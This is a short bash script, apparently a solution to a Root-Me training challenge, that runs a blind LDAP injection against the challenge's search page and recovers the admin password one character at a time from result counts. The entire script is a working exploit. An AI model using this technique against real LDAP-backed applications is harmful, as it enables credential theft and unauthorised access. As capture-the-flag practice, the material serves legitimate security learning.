#!/bin/bash

url="http://challenge01.root-me.org/web-serveur/ch26/?action=dir&search=admin*%29%28password%3D"

pass=
add=true
while [ $add = true ]
do
    add=false
    for i in a b c d e f g h i j k l m n o p q r s t u v w x y z 0 1 2 3 4 5 6 7 8 9
    do
        res=$(curl $url$pass$i 2> /dev/null | \grep -o "[0-9] result" | cut '-d ' -f 1)
        if [ "$res" -ge 1 ]; then
            pass=$pass$i
            echo -n $i
            add=true
            break
        fi
    done
done
echo
